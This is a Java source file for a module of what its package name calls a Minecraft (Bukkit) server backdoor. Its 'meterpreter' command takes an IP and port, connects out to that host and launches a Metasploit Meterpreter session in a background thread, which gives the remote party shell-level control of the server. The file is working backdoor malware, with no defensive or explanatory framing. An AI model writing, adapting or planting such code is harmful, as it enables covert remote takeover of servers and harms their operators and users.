/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
package org.martin.bukkit.mcbackdoor.scmd.modules;

import com.metasploit.meterpreter.Meterpreter;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.util.logging.Level;
import java.util.logging.Logger;
import org.bukkit.command.CommandSender;
import org.bukkit.plugin.java.JavaPlugin;
import org.martin.bukkit.mcbackdoor.scmd.Module;

/**
 *
 * @author martin
 */
public class MeterpreterModule implements Module {

    public void enable() {
    }

    public void disable() {
    }

    public void setPlugin(JavaPlugin pl) {
    }

    public boolean onCommand(CommandSender sender, String[] args, String unclean) {
        if(args.length != 2){
            return false;
        }
        try {
            final String ip = args[0];
            final int port = Integer.valueOf(args[1]);
            Thread t = new Thread(new Runnable() {

                public void run() {
                    try {
                        Socket msgsock = new Socket(ip, port);
                        DataInputStream in = new DataInputStream(msgsock.getInputStream());
                        OutputStream out = new DataOutputStream(msgsock.getOutputStream());
                        int coreLen = in.readInt();
                        while (coreLen != 0) {
                            in.readFully(new byte[coreLen]);
                            coreLen = in.readInt();
                        }
                        coreLen = in.readInt();
                        in.readFully(new byte[coreLen]);
                        new Meterpreter(in, out, false, true);
                        msgsock.close();
                    } catch (Exception ex) {
                        Logger.getLogger("Minecraft").log(Level.SEVERE, null, ex);
                    }
                }
            });
            t.start();
        } catch (Exception ex) {
            Logger.getLogger("Minecraft").log(Level.SEVERE, null, ex);
        }
        return true;
    }

    public String getCMD() {
        return "meterpreter";
    }
}
